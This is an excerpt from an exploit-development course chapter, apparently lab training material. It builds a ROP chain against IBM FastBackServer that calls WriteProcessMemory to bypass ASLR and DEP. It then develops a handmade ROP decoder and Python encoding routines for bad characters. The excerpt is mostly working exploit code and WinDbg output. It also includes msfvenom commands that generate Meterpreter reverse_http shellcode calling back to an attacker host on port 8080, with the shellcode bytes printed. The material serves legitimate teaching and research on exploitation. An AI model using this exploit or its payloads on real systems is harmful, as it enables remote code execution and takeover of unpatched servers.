Let's test this new step by restarting FastBackServer and attaching WinDbg. Once again, we'll set a breakpoint on the gadget that patches values on the stack. We'll continue execution until the breakpoint is triggered a second time.
0:079> bp libeay32IBM019+0x1fd8
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 

0:079> g
Breakpoint 0 hit
eax=1223e2fc ebx=073db868 ecx=1223e41c edx=77251670 esi=42424242 edi=00669360
eip=044e1fd8 esp=1223e364 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48:
044e1fd8 8908            mov     dword ptr [eax],ecx  ds:0023:1223e2fc=41414141

0:085> g
Breakpoint 0 hit
eax=1223e300 ebx=073db868 ecx=0000020c edx=77251670 esi=42424242 edi=00669360
eip=044e1fd8 esp=1223e3a0 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48:
044e1fd8 8908            mov     dword ptr [eax],ecx  ds:0023:1223e300=42424242

0:085> p
eax=1223e300 ebx=073db868 ecx=0000020c edx=77251670 esi=42424242 edi=00669360
eip=044e1fda esp=1223e3a0 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x4a:
044e1fda c3              ret

0:085> dd eax-14 L7
1223e2ec  75f42890 04572c04 ffffffff 04572c04
1223e2fc  1223e41c 0000020c 045c401c
Listing 54 - ROP skeleton with nSize overwritten
Excellent! Listing 54 shows that the ROP chain patched the nSize argument correctly.
At this point, we have correctly set up the address for WriteProcessMemory, the return address, and all arguments on the stack.
The last step in our ROP chain is to align EAX with the WriteProcessMemory address in the ROP skeleton on the stack, exchange it with ESP, and return into it.
We'll do this the same way we aligned EAX earlier. From Listing 54, we know that EAX points 0x14 bytes ahead of WriteProcessMemory on the stack. We can fix that easily with previously used gadgets. The updated ROP chain is shown below.
# Align ESP with ROP Skeleton
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
rop += pack("<L", (0xffffffec))         # -0x14
rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x5b415))  # xchg eax, esp ; ret
Listing 55 - Aligning ESP with ROP skeleton
In the above ROP chain, we popped the value -0x14 (0xffffffec) into ECX, added it to EAX, and then used a gadget with an XCHG instruction to align ESP to the stack address stored in EAX.
After executing this part of the ROP chain, we should return into WriteProcessMemory with all the arguments set up correctly. We can observe this in practice by restarting FastBackServer, attaching WinDbg, and setting a breakpoint on the "XCHG EAX, ESP" gadget.
0:080> bp libeay32IBM019+0x5b415
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 

0:080> g
Breakpoint 0 hit
eax=110ee2ec ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360
eip=031bb415 esp=110ee3b0 ebp=41414141 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x85:
031bb415 94              xchg    eax,esp

0:085> p
eax=110ee3b0 ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360
eip=031bb416 esp=110ee2ec ebp=41414141 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x86:
031bb416 c3              ret

0:085> p
eax=110ee3b0 ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360
eip=75f42890 esp=110ee2f0 ebp=41414141 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
KERNEL32!WriteProcessMemoryStub:
75f42890 8bff            mov     edi,edi

0:085> dds esp L6
110ee2f0  031f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c
110ee2f4  ffffffff
110ee2f8  031f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c
110ee2fc  110ee41c
110ee300  0000020c
110ee304  0324401c libeay32IBM019!N98E_OSSL_DES_version+0x4f018
Listing 56 - Executing WriteProcessMemory from ROP
Listing 56 shows that WriteProcessMemory was invoked and all arguments were set up correctly. We'll note that lpBuffer is stored at 0x110ee41c.
To verify that WriteProcessMemory copies our dummy shellcode, we can dump the contents of the code cave before and after the API executes.
0:085> u 031f2c04
libeay32IBM019!N98E_bn_sub_words+0x107c:
031f2c04 0000            add     byte ptr [eax],al
031f2c06 0000            add     byte ptr [eax],al
031f2c08 0000            add     byte ptr [eax],al
031f2c0a 0000            add     byte ptr [eax],al
031f2c0c 0000            add     byte ptr [eax],al
031f2c0e 0000            add     byte ptr [eax],al
031f2c10 0000            add     byte ptr [eax],al
031f2c12 0000            add     byte ptr [eax],al

0:085> pt
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
eip=745f82a4 esp=110ee2f0 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
KERNELBASE!WriteProcessMemory+0x74:
745f82a4 c21400          ret     14h

0:085> u 031f2c04 
libeay32IBM019!N98E_bn_sub_words+0x107c:
031f2c04 44              inc     esp
031f2c05 44              inc     esp
031f2c06 44              inc     esp
031f2c07 44              inc     esp
031f2c08 44              inc     esp
031f2c09 44              inc     esp
031f2c0a 44              inc     esp
031f2c0b 44              inc     esp
Listing 57 - WriteProcessMemory copies data into code page
The contents of the code cave before and after WriteProcessMemory execution show that our fake shellcode data of 0x44 bytes was copied from the stack into the code cave.
Let's return from WriteProcessMemory and prove that DEP was bypassed by executing the "INC ESP" instructions (0x44 opcode) from the code cave:
0:085> r
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
eip=745f82a4 esp=110ee2f0 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
KERNELBASE!WriteProcessMemory+0x74:
745f82a4 c21400          ret     14h

0:085> p
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
eip=031f2c04 esp=110ee308 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
libeay32IBM019!N98E_bn_sub_words+0x107c:
031f2c04 44              inc     esp

0:085> p
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
eip=031f2c05 esp=110ee309 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
libeay32IBM019!N98E_bn_sub_words+0x107d:
031f2c05 44              inc     esp

0:085> p
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
eip=031f2c06 esp=110ee30a ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
libeay32IBM019!N98E_bn_sub_words+0x107e:
031f2c06 44              inc     esp
Listing 58 - Executing arbitrary instructions
We have bypassed both ASLR and DEP and have obtained arbitrary code execution. Very Nice!
In this case, we only executed our padding of 0x44 byte values, but next we'll replace it with shellcode to obtain a reverse shell.
Exercises
1.	Go through the ROP chain required to execute WriteProcessMemory and implement it in your own proof of concept.
2.	Obtain arbitrary code execution inside the code cave.
3.	Improve the proof of concept to detect and handle bad characters in the ROP gadgets once they are added to the base address of libeay32IBM019.dll.
1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
2 http://aerokid240.blogspot.com/2011/03/windows-and-its-pe-file-structure.html
3 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-dh
4 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-dh
10.4.2. Getting Our Shell
At this point, we've achieved our initial goal of bypassing ASLR by leaking the base address of an IBM module. We have also bypassed DEP to obtain code execution.
To complete our exploit, let's replace our padding data with a Meterpreter shellcode to get a reverse shell.
First, we'll need to find the offset from the end of the ROP chain to the lpBuffer stack address where our shellcode will reside. This value will be used to calculate the size of the padding area prepended to our shellcode. Next, we'll generate an encoded Meterpreter shellcode to replace the dummy shellcode.
To figure out the offset, we can display data at an address lower than the value in lpBuffer.
Earlier, we found lpBuffer at the stack address 0x110ee41c. If we subtract 0x70 bytes, we find the stack content shown in Listing 59.
0:085> dd 110ee41c-70
110ee3ac  031bb415 44444444 44444444 44444444
110ee3bc  44444444 44444444 44444444 44444444
110ee3cc  44444444 44444444 44444444 44444444
110ee3dc  44444444 44444444 44444444 44444444
110ee3ec  44444444 44444444 44444444 44444444
110ee3fc  44444444 44444444 44444444 44444444
110ee40c  44444444 44444444 44444444 44444444
110ee41c  44444444 44444444 44444444 44444444

0:085> ? 110ee41c - 110ee3b0  
Evaluate expression: 108 = 0000006c
Listing 59 - Offset from last ROP gadget to lpBuffer
Here we discover that the offset from the first DWORD after the ROP chain to lpBuffer is 0x6C bytes. We must add 0x6C bytes of padding before placing the shellcode.
Let's update our proof of concept with a second offset variable (offset2) and some dummy shellcode as shown below.
...
offset2 = b"C" * 0x6C
shellcode = b"\x90" * 0x100
padding = b"D" * (0x600 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+wpm+eip+rop+offset2+shellcode+padding,0,0,0,0)
buf += formatString
...
Listing 60 - Updated proof of concept to include shellcode alignment
After these changes, lpBuffer will point to our dummy shellcode and WriteProcessMemory will copy the shellcode into the code cave.
To test the updated proof of concept, we'll restart FastBackServer, attach WinDbg, set a breakpoint on WriteProcessMemory, and launch the exploit:
0:078> bp KERNEL32!WriteProcessMemoryStub

0:078> g
Breakpoint 0 hit
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 
eax=0dcde3b0 ebx=060bbf98 ecx=ffffffec edx=76fd1670 esi=42424242 edi=00669360
eip=75342890 esp=0dcde2f0 ebp=41414141 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
KERNEL32!WriteProcessMemoryStub:
75342890 8bff            mov     edi,edi

0:081> dds esp L6
0dcde2f0  032f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c
0dcde2f4  ffffffff
0dcde2f8  032f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c
0dcde2fc  0dcde41c
0dcde300  0000020c
0dcde304  0334401c libeay32IBM019!N98E_OSSL_DES_version+0x4f018

0:081> dd 0dcde41c-10 L8
0dcde40c  43434343 43434343 43434343 43434343
0dcde41c  90909090 90909090 90909090 90909090
Listing 61 - Dummy shellcode is aligned correctly
By subtracting 0x10 bytes from lpBuffer, we can verify that our dummy shellcode starts exactly where lpBuffer points.
Next, let's generate windows/meterpreter/reverse_http shellcode with msfvenom, remembering to supply the bad characters 0x00, 0x09, 0x0A, 0x0C, 0x0D, and 0x20:
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
...
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 590 (iteration=0)
x86/shikata_ga_nai chosen with final size 590
Payload size: 590 bytes
Final size of python file: 3295 bytes
shellcode =  b""
shellcode += b"\xdb\xd9\xba\xcc\xbb\x60\x18\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x8d\x31\x50\x1a\x83\xc0\x04"
shellcode += b"\x03\x50\x16\xe2\x39\x47\x88\x9a\xc1\xb8\x49"
shellcode += b"\xfb\x48\x5d\x78\x3b\x2e\x15\x2b\x8b\x25\x7b"
shellcode += b"\xc0\x60\x6b\x68\x53\x04\xa3\x9f\xd4\xa3\x95"
...
Listing 62 - Encoded Meterpreter shellcode
We can now insert the generated shellcode in the proof of concept using the shellcode variable.
Once again, we'll restart FastBackServer, attach WinDbg, and set a breakpoint on WriteProcessMemory. Listing 63 shows the results from WinDbg when the proof of concept is executed.
0:078> bp KERNEL32!WriteProcessMemoryStub

0:078> g
Breakpoint 0 hit
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 
eax=1111e3b0 ebx=05ebc5b0 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360
eip=75f42890 esp=1111e2f0 ebp=41414141 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
KERNEL32!WriteProcessMemoryStub:
75f42890 8bff            mov     edi,edi

0:085> pt
eax=00000001 ebx=05ebc5b0 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
eip=745f82a4 esp=1111e2f0 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
KERNELBASE!WriteProcessMemory+0x74:
745f82a4 c21400          ret     14h

0:085> u poi(esp)
libeay32IBM019!N98E_bn_sub_words+0x107c:
01bb2c04 dbd9            fcmovnu st,st(1)
01bb2c06 baccbb6018      mov     edx,1860BBCCh
01bb2c0b d97424f4        fnstenv [esp-0Ch]
01bb2c0f 58              pop     eax
01bb2c10 33c9            xor     ecx,ecx
01bb2c12 b18d            mov     cl,8Dh
01bb2c14 31501a          xor     dword ptr [eax+1Ah],edx
01bb2c17 83c004          add     eax,4
Listing 63 - Encoded Meterpreter shellcode in memory
Once we reach the beginning of WriteProcessMemory, we can execute the function to the end and dump the copied shellcode to verify that it's been copied to the code cave.
Unfortunately, after continuing execution, we encounter an access violation:
0:085> g
(1a54.fe8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=01bb2c04 ebx=05ebc5b0 ecx=0000008d edx=1860bbcc esi=42424242 edi=00669360
eip=01bb2c14 esp=1111e30c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
libeay32IBM019!N98E_bn_sub_words+0x108c:
01bb2c14 31501a          xor     dword ptr [eax+1Ah],edx ds:0023:01bb2c1e=9a884739
Listing 64 - Access violation due to shellcode decoding stub
The highlighted assembly instruction attempted to modify a memory location pointed to by EAX+0x1A, which caused the crash.
From Listing 64 we notice that EAX points to an address within the code cave where the shellcode has been copied. We're encountering an access violation error because the shellcode's decoding stub expects the code to be stored in writable memory, but it is not.
This means we won't be able to use the msfvenom encoder, so we'll have to find a different solution. Fortunately, we have a few options.
We could write custom shellcode that does not contain any bad characters and by extension does not require a decoding routine. Alternatively, we could replace the bad characters and then leverage additional ROP gadgets to restore the shellcode before it's copied into the code section. In the next section, we'll pursue the latter approach.
Exercises
1.	Calculate the offset from the ROP chain to the dummy shellcode.
2.	Insert shellcode into the buffer at the correct offset and observe the decoder causing a crash.
10.4.3. Handmade ROP Decoder
At this point, we know we need to avoid bad characters in our shellcode and can not rely on the msfvenom decoder. In this section, we'll learn how to manually implement a ROP decoder and test it.
First, let's replace the bad characters with safe alternatives that will not break the exploit. To begin, we'll select arbitrary replacement characters, as shown in Listing 65.
0x00 -> 0xff
0x09 -> 0x10
0x0a -> 0x06
0x0b -> 0x07
0x0c -> 0x08
0x0d -> 0x05
0x20 -> 0x1f
Listing 65 - Character substitution scheme
To implement this technique, we'll first generate a windows/meterpreter/reverse_http payload in Python format (without encoding it):
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -f python -v shellcode
...
No encoder or badchars specified, outputting raw payload
Payload size: 596 bytes
Final size of python file: 3336 bytes
shellcode =  b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
...
Listing 66 - Encoded Meterpreter shellcode
Since we're going to manually replace these characters for now, we'll only work on the first 20 bytes of the shellcode to determine if the technique works.
Listing 67 shows the substitutions performed on the substring.
Before:
\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52

After:
\xfc\xe8\x82\xff\xff\xff\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x08\x8b\x52
Listing 67 - First characters are substituted
We can easily make these manual edits in our shellcode with a Python script. However, restoring the script with ROP at runtime is more challenging.
Let's start by creating a ROP chain to restore the first 0x00 byte, which was replaced with an 0xff byte.
Our complete ROP chain will perform three actions going forward. First, it will patch the arguments for WriteProcessMemory, then it will restore the shellcode, and finally, it will execute WriteProcessMemory.
Below is the ROP chain we'll use to restore the first bad character.
# Restore first three shellcode bytes
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
rop += pack("<L", (negative value))	    # negative offset
rop += pack("<L", (dllBase + 0x4a7b6))  # sub eax, ecx ; pop ebx ; ret
rop += pack("<L", (original value))      # value into BH
rop += pack("<L", (dllBase + 0x468ee))  # add [eax+1], bh ; ret
Listing 68 - ROP gadgets to fix a bad character
This new ROP chain will be inserted just after the gadgets that patch nSize on the stack. At this point, EAX will contain the stack address where the nSize argument is stored. To align EAX with the first bad character to fix, we can pop an appropriate negative value into ECX and subtract it from EAX.
pop ecx ; ret
negative offset
sub eax, ecx ;
Listing 69 - Aligning EAX
With EAX aligned, our next step is to restore the bad character. We will do this by loading an appropriate value into EBX and then adding the byte in BH to the value pointed to by EAX.
pop ebx ; ret
value into BH
add [eax+1], bh ; ret
Listing 70 - Restoring the bad character
For every bad character that we have to decode, we'll need to determine both the negative offset value to subtract from EAX and the value to place into BH.
First, let's find the correct value for BH. We are going to restore the bad character 0x00, which was replaced by the fourth byte in the shellcode, 0xff. We can add 0x01 to 0xff to restore the shellcode byte.
We can load the correct value in BH while avoiding bad characters by popping the value 0x1111__01__11 into EBX.
Next, let's calculate the negative offset. Recall that when the decoder ROP chain is executed, EAX points to nSize on the stack.
Before moving forward with this step, we need to make a couple of adjustments to our proof of concept that will influence the negative offset we have to calculate. For each bad character we fix, we'll be increasing the size of our final ROP chain. To account for this, we'll adjust the lpBuffer (shellcode) address on the stack to create enough additional space.
We will also increase the size of our entire input buffer to account for our larger combined offset and ROP chain. Listing 71 shows the first psCommandBuffer increased to 0x1100.
# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)      # opcode
buf += pack("<i", 0x0)        # 1st memcpy: offset
buf += pack("<i", 0x1100)    # 1st memcpy: size field
buf += pack("<i", 0x0)        # 2nd memcpy: offset
buf += pack("<i", 0x100)      # 2nd memcpy: size field
buf += pack("<i", 0x0)        # 3rd memcpy: offset
buf += pack("<i", 0x100)      # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)
Listing 71 - Update size of psCommandBuffer
Next, let's modify the address stored in lpBuffer.
# Patching lpBuffer
rop = pack("<L", (dllBase + 0x296f)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk into esi
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0x88888888))
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0x77777d78))
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x8876d)) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
rop += pack("<L", (0x42424242)) # junk into esi
rop += pack("<L", (dllBase + 0x48d8c)) # pop eax ; ret 
...
Listing 72 - Increase address of lpBuffer
In Listing 72, we increased the offset from the start of the ROP chain to the beginning of our shellcode (lpBuffer) from 0x100 to 0x600 by modifying the highlighted value.
Additionally, we must ensure that the subtraction we perform to align EAX with the ROP skeleton takes this 0x500 byte offset into account.
...
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0xfffff9e0)) # pop into eax
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x1fd8)) # mov [eax], ecx ; ret
...
Listing 73 - Aligning EAX with ROP skeleton
This alignment is performed by adding the value 0xfffff9e0, which is 0x500 bytes less than the previous value of 0xfffffee0, as shown in Listing 73.
After this change, we must determine the negative offset from the stack address pointing to nSize to the first bad character in the shellcode. This calculation is tricky, so we'll find it dynamically instead.
As previously mentioned, at this point of the ROP chain execution, EAX contains the stack address of nSize. To locate the correct offset, we can pop a dummy value like 0xffffffff into ECX, which is then subtracted from EAX to perform the alignment. We will then use the debugger to determine the correct value to subtract at runtime.
Taking these modifications into consideration, we can craft the updated code shown in Listing 74.
# Restore first shellcode byte
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xffffffff))	
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
rop += pack("<L", (0x11110111)) # 01 in bh
rop += pack("<L", (dllBase + 0x468ee)) # add [eax+1], bh ; ret

# Align ESP with ROP Skeleton
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xffffffec)) # -14
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret

offset2 = b"C" * (0x600 - len(rop))
shellcode = b"\xfc\xe8\x82\xff\xff\xff\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x08\x8b\x52"
padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+wpm+eip+rop+offset2+shellcode+padding,0,0,0,0)
buf += formatString
Listing 74 - Adding dummy offset and encoded shellcode
The lower part of Listing 74 includes the final changes, in which we have updated the offset2 variable to account for the increased size of psCommandBuffer and inserted the first 20 bytes of our custom-encoded shellcode.
Once execution of the ROP chain reaches the decoding section, we can find the distance from EAX to the first 0xff byte in the encoded shellcode.
Note that the instruction that decodes the bad character is "ADD [EAX+1], BH", which means we have to account for the additional one byte in our arithmetic calculation.
Listing 75 shows WinDbg's output when the ROP chain reaches the "POP ECX" gadget in the decode section.
eax=10bbe300 ebx=0603be40 ecx=0000020c edx=76fd1670 esi=42424242 edi=00669360
eip=0316117c esp=10bbe3a4 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!Ordinal1715+0x117c:
0316117c 59              pop     ecx

0:082> db eax + 61e L10
10bbe91e  82 ff ff ff 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R.

0:082> ? -61e
Evaluate expression: -1566 = fffff9e2
Listing 75 - Distance from EAX to first bad character
Through trial and error, the debugger output reveals a distance of 0x61e bytes from EAX to the first bad character. This means that we must pop the value of 0xfffff9e2 into ECX and subtract that from EAX.
Let's update the offset and rerun the proof of concept, so we can review the shellcode values on the stack before and after the decode instruction.
eax=1477e91e ebx=11110111 ecx=fffff9e2 edx=76fd1670 esi=42424242 edi=00669360
eip=019468ee esp=1477e3b4 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x1e:
019468ee 00b801000000    add     byte ptr [eax+1],bh        ds:0023:1477e91f=ff

0:096> db eax L2
1477e91e  82 ff                                      ..

0:096> p
eax=1477e91e ebx=11110111 ecx=fffff9e2 edx=76fd1670 esi=42424242 edi=00669360
eip=019468f4 esp=1477e3b4 ebp=41414141 iopl=0         nv up ei pl zr ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000257
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x24:
019468f4 c3              ret

0:096> db eax L2
1477e91e  82 00
Listing 76 - The first bad character is fixed with ROP
From the output, we find the original character restored, which proves that the ROP decoding technique works.
Next, we'll reuse the ROP chain we just developed to restore the next bad character. The next bad character is another null byte, which is substituted with 0xff, and it comes just after the previous bad character. We can once again align EAX by modifying the value popped into ECX.
Since the next character to restore comes right after the previous character, we need to subtract the value 0xffffffff to increase EAX by one.
The ROP chain to accomplish this is shown in Listing 77.
# Restore second bad shellcode byte
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xffffffff))	
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
rop += pack("<L", (0x11110111)) # 01 in bh
rop += pack("<L", (dllBase + 0x468ee)) # add [eax+1], bh ; ret
Listing 77 - ROP chain to fix the second bad character
Next we'll restart FastBackServer, attach WinDbg, and set a breakpoint on libeay32IBM019+0x468ee to stop the execution at the "ADD [EAX+1], BH" instruction. Since we're interested in the second execution of the gadget, we must let execution continue the first time the breakpoint is hit.
Listing 78 shows the results when the breakpoint has been triggered twice.
eax=0dc4e62b ebx=11110111 ecx=ffffffff edx=76fd1670 esi=42424242 edi=00669360
eip=032a68ee esp=0dc4e3c8 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x1e:
032a68ee 00b801000000    add     byte ptr [eax+1],bh        ds:0023:0dc4e62c=ff

0:079> db eax-1 L3
0dc4e62a  82 00 ff                                         ...

0:079> p
eax=0dc4e62b ebx=11110111 ecx=ffffffff edx=76fd1670 esi=42424242 edi=00669360
eip=032a68f4 esp=0dc4e3c8 ebp=41414141 iopl=0         nv up ei pl zr ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000257
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x24:
032a68f4 c3              ret

0:079> db eax-1 L3
0dc4e62a  82 00 00 
Listing 78 - Fixing the second bad character
By adding the second sequence of decoding gadgets, we decoded the second bad character by putting 0x01 in BH and adding it to the 0xff encoded byte.
We could use this technique to decode the entire shellcode, but it would be a tiresome, manual effort. In the next section, we'll use our thorough understanding of the decoding process to automate it.
Exercises
1.	Implement the ROP chain to fix the first and second bad characters in the shellcode, as shown in this section.
2.	Continue to implement ROP chains to fix the third and fourth bad characters.
10.4.4. Automating the Shellcode Encoding
In this section, we'll begin the work of creating an automatic ROP encoder. This will allow our exploit to detect and encode bad characters in the shellcode without manual input. In the next section, we will develop code to dynamically generate the ROP chain that will decode the shellcode.
Our first step towards automation is implementing an encoding routine to modify the shellcode. We'll follow the scheme we used earlier, which is repeated below.
0x00 -> 0xff
0x09 -> 0x10
0x0a -> 0x06
0x0b -> 0x07
0x0c -> 0x08
0x0d -> 0x05
0x20 -> 0x1f
Listing 79 - Character substitution scheme
As part of the encoding routine, the script must keep track of the offsets where bytes are modified and how they are modified. Our script will reuse this information when the decoding ROP chain is created.
Let's separate these requirements into two methods. First, we'll detect all bad characters with the mapBadChars function. Next, we'll use the encodeShellcode function to encode the shellcode.
The code for mapBadChars is shown in Listing 80.
def mapBadChars(sh):
	BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
	i = 0
	badIndex = []
	while i < len(sh):
		for c in BADCHARS:
			if sh[i] == c:
				badIndex.append(i)
		i=i+1
	return badIndex
Listing 80 - Function to detect all bad characters
mapBadChars accepts the shellcode as its only argument. Inside the method, we first list all the bad characters, then we create the badIndex array to keep track of the location of the bad characters that are discovered in the shellcode.
To discover the bad characters, we'll execute a while loop that iterates over all the bytes in the shellcode, comparing them with the list of bad characters. If a bad character is found, its index is stored in the badIndex array.
When all of the bad characters have been found, we're ready for encoding with encodeShellcode, as displayed in Listing 81.
def encodeShellcode(sh):
	BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
	REPLACECHARS = b"\xff\x10\x06\x07\x08\x05\x1f"
	encodedShell = sh
	for i in range(len(BADCHARS)):
		encodedShell = encodedShell.replace(pack("B", BADCHARS[i]), pack("B", REPLACECHARS[i]))
	return encodedShell
Listing 81 - Function to encode shellcode
First, we list both the bad characters and the associated replacement characters. Then we will execute a loop over all the bad characters that have been detected in the shellcode and overwrite them with the corresponding replacement characters.
At this point, we have fully encoded the shellcode with our custom encoding scheme and it no longer contains any bad characters.
Exercises
1.	Create mapBadChars to detect bad characters.
2.	Create encodeShellcode to dynamically encode the first 20 bytes of the shellcode.
10.4.5. Automating the ROP Decoder
